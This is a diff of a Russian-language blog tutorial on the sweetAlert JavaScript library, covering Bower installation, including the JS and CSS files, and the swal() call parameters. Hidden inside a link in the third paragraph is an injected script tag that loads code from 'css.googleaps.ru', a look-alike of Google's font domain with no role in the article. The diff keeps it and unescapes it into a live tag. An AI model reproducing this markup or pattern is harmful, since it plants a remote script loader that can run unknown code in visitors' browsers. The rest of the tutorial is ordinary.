@@ -43,61 +43,61 @@ tags:
 comments: []
 ---
 <p>Когда делаешь вебсайты и используешь в них&nbsp;JavaScript нам часто приходится делать обратную связь с пользователями и давать понять им, что действие, которое они запросили было выполнено или нет. Раньше разработчики использовали window.alert(). Очень удобно, что эту функцию поддерживают все браузеры, но они не предоставляют никакого функционала для их стилизации. Сегодня разработчики предпочитают сами создавать модальные окна. В этой статье хотелось бы рассказать вам о библиотеке sweetAlert, которая заменяет собой обычный alert()<a id="more"></a><a id="more-357"></a></p>
-<h2>Что представляет собой sweetAlert?<&#47;h2><br />
+<h2>Что представляет собой sweetAlert?</h2><br />
 Как я уже говорил, библиотека sweetAlert это замена стандартной функции window.alert(). Библиотека не несет за собой никакие зависимости. Состоит только из двух файлов: js и css.</p>
-<p>Эта библиотека имеет три особенности. Первое - вы можете использовать ее в любом проекте. <a href="https:&#47;&#47;github.com&#47;lipis&#47;bootstrap-sweetalert">Второе<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;a> это отдельная ветка специально адаптированная для Twitter Bootstrap. И третье, <a href="https:&#47;&#47;github.com&#47;pedant&#47;sweet-alert-dialog">отдельная ветка<&#47;a> которую вы можете использовать в ваших Android проектах.</p>
+<p>Эта библиотека имеет три особенности. Первое - вы можете использовать ее в любом проекте. <a href="https://github.com/lipis/bootstrap-sweetalert">Второе<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></a> это отдельная ветка специально адаптированная для Twitter Bootstrap. И третье, <a href="https://github.com/pedant/sweet-alert-dialog">отдельная ветка</a> которую вы можете использовать в ваших Android проектах.</p>
 <p>Теперь давайте посмотрим, как использовать библиотеку на вашем сайте.</p>
-<h2>Начинаем работу с sweetAlert<&#47;h2><br />
-Для использования sweetAlert в вашем проекте необходимо скачать файлы и подключить на тех страницах, на которых потребуется использование. Вы можете скачать исходники из <a href="https:&#47;&#47;github.com&#47;t4t5&#47;sweetalert">GitHub репозитория<&#47;a>, либо воспользоваться Bower для установки. Для этого выполните команду:</p>
-<pre class="brush: bash; gutter: true">bower install sweetalert<&#47;pre><br />
+<h2>Начинаем работу с sweetAlert</h2><br />
+Для использования sweetAlert в вашем проекте необходимо скачать файлы и подключить на тех страницах, на которых потребуется использование. Вы можете скачать исходники из <a href="https://github.com/t4t5/sweetalert">GitHub репозитория</a>, либо воспользоваться Bower для установки. Для этого выполните команду:</p>
+<pre class="brush: bash; gutter: true">bower install sweetalert</pre><br />
 Далее, необходимо подключить библиотеку к телу страницы (советую весь javascript подключать всегда в конце страницы):</p>
-<pre class="brush: html; gutter: true"><script src="path&#47;to&#47;sweet-alert.min.js"><&#47;script><&#47;pre><br />
+<pre class="brush: html; gutter: true"><script src="path/to/sweet-alert.min.js"></script></pre><br />
 Также подключаем файл стилей:</p>
 <pre class="brush: html; gutter: true">
-<link rel="stylesheet" href="path&#47;to&#47;sweet-alert.css" &#47;>
-<&#47;pre><br />
+<link rel="stylesheet" href="path/to/sweet-alert.css" />
+</pre><br />
 Когда библиотека будет подключена вы можете начинать использовать ее в своем проекте:</p>
-<pre class="brush: javascript; gutter: true">sweetAlert(&#039;Поздравляем!&#039;, &#039;Ваше сообщение было успешно отправлено!&#039;, &#039;success&#039;);<&#47;pre><br />
+<pre class="brush: javascript; gutter: true">sweetAlert(&#039;Поздравляем!&#039;, &#039;Ваше сообщение было успешно отправлено!&#039;, &#039;success&#039;);</pre><br />
 Результат будет следующий:</p>
-<p>[jsfiddle url="http:&#47;&#47;jsfiddle.net&#47;9k6o13qw&#47;10&#47;"]</p>
+<p>[jsfiddle url="http://jsfiddle.net/9k6o13qw/10/"]</p>
 <p>Не знаю как вам, но я люблю небольшие анимации!</p>
 <p>Как вы могли наблюдать в предыдущем примере, библиотека работает через функцию sweetAlert. Она принимает три параметра:</p>
 <ul>
-<li>title (обязательно) - Строка основного заголовка алерта<&#47;li>
-<li>message (опционально) - необязательная строка более подробного сообщения ниже заголовка<&#47;li>
-<li>type (опционально) - необязательная строка, указывающая на тип алерта. Значение может быть successm errorm warning и info<&#47;li><br />
-<&#47;ul><br />
+<li>title (обязательно) - Строка основного заголовка алерта</li>
+<li>message (опционально) - необязательная строка более подробного сообщения ниже заголовка</li>
+<li>type (опционально) - необязательная строка, указывающая на тип алерта. Значение может быть successm errorm warning и info</li><br />
+</ul><br />
 Библиотека также предлагает короткое имя для вызова:</p>
-<pre class="brush: javascript; gutter: false">swal(&#039;Congratulations!&#039;, &#039;Your message has been succesfully sent&#039;, &#039;success&#039;);<&#47;pre><br />
+<pre class="brush: javascript; gutter: false">swal(&#039;Congratulations!&#039;, &#039;Your message has been succesfully sent&#039;, &#039;success&#039;);</pre><br />
 В дополнении ко всему, функция может принимать параметры в качестве объекта. Предыдущий пример может быть перезаписан как</p>
 <pre class="brush: javascript; gutter: true">swal({<br />
 &nbsp;&nbsp; title: &#039;Congratulations!&#039;,<br />
 &nbsp;&nbsp; text: &#039;Your message has been succesfully sent&#039;,<br />
 &nbsp;&nbsp; type: &#039;success&#039;<br />
-});<&#47;pre><br />
+});</pre><br />
 Теперь мы знаем основы библиотеки. Перейдем к углубленному изучению параметров</p>
-<h2>Параметры sweetAlert<&#47;h2></p>
+<h2>Параметры sweetAlert</h2></p>
 <table>
 <tbody>
 <tr>
-<th style="text-align: left;">confirmButtonText<&#47;th></p>
-<td>Текст кнопки "ОК"<&#47;td><br />
-<&#47;tr></p>
+<th style="text-align: left;">confirmButtonText</th></p>
+<td>Текст кнопки "ОК"</td><br />
+</tr></p>
 <tr>
-<th style="text-align: left;">cancelButtonText<&#47;th></p>
-<td>Текст кнопки "Отмена"<&#47;td><br />
-<&#47;tr></p>
+<th style="text-align: left;">cancelButtonText</th></p>
+<td>Текст кнопки "Отмена"</td><br />
+</tr></p>
 <tr>
-<th style="text-align: left;">showCancelButton<&#47;th></p>
-<td>Показывать или нет кнопку отмена. По умолчанию false. Чтобы показывать, необходимо установить в true<&#47;td><br />
-<&#47;tr></p>
+<th style="text-align: left;">showCancelButton</th></p>
+<td>Показывать или нет кнопку отмена. По умолчанию false. Чтобы показывать, необходимо установить в true</td><br />
+</tr></p>
 <tr>
-<th style="text-align: left;">confirmButtonColor<&#47;th></p>
-<td>&nbsp;Задается цвет кнопки "ОК". Можно задавать как #000000, как Black или как&nbsp; rgb(0,0,0)<&#47;td><br />
-<&#47;tr></p>
+<th style="text-align: left;">confirmButtonColor</th></p>
+<td>&nbsp;Задается цвет кнопки "ОК". Можно задавать как #000000, как Black или как&nbsp; rgb(0,0,0)</td><br />
+</tr></p>
 <tr>
-<th style="text-align: left;">&nbsp;timer<&#47;th></p>
-<td>Указывается через сколько милисекунд автоматически закрыть алерт.<&#47;td><br />
-<&#47;tr><br />
-<&#47;tbody><br />
-<&#47;table></p>
+<th style="text-align: left;">&nbsp;timer</th></p>
+<td>Указывается через сколько милисекунд автоматически закрыть алерт.</td><br />
+</tr><br />
+</tbody><br />
+</table></p>
